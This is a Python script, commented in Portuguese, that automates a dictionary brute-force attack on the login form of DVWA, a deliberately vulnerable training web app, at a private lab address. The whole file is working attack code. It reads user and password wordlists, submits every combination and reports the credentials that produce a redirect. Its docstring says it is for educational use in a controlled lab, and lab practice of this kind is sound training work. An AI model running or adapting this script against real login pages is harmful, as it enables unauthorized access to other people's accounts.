#!/usr/bin/env python3
"""
Script de automação para ataque de força bruta no DVWA
Uso educacional apenas - Laboratório controlado
"""

import requests
import sys
from time import sleep

TARGET_IP = "192.168.56.102"
DVWA_URL = f"http://{TARGET_IP}/dvwa/login.php"

def load_wordlist(filename):
    """Carrega wordlist de arquivo"""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Arquivo {filename} não encontrado")
        sys.exit(1)

def try_login(session, username, password):
    """Tenta login e retorna True se bem-sucedido"""
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    
    try:
        response = session.post(DVWA_URL, data=data, allow_redirects=False, timeout=5)
        # DVWA redireciona (302) quando login é bem-sucedido
        return response.status_code == 302
    except requests.RequestException as e:
        print(f"[!] Erro na requisição: {e}")
        return False

def main():
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <users.txt> <passwords.txt>")
        sys.exit(1)
    
    users_file = sys.argv[1]
    passwords_file = sys.argv[2]
    
    users = load_wordlist(users_file)
    passwords = load_wordlist(passwords_file)
    
    print(f"[*] Iniciando ataque contra {DVWA_URL}")
    print(f"[*] Usuários: {len(users)}, Senhas: {len(passwords)}")
    print(f"[*] Total de tentativas: {len(users) * len(passwords)}\n")
    
    session = requests.Session()
    
    # Primeiro acesso para obter cookie de sessão
    session.get(DVWA_URL)
    
    found = False
    
    for user in users:
        for password in passwords:
            print(f"[*] Tentando: {user}:{password}", end="\r")
            
            if try_login(session, user, password):
                print(f"\n[+] SUCESSO! Credencial encontrada: {user}:{password}")
                found = True
                break
            
            # Pequeno delay para não sobrecarregar
            sleep(0.1)
        
        if found:
            break
    
    if not found:
        print("\n[-] Nenhuma credencial encontrada")

if __name__ == "__main__":
    main()
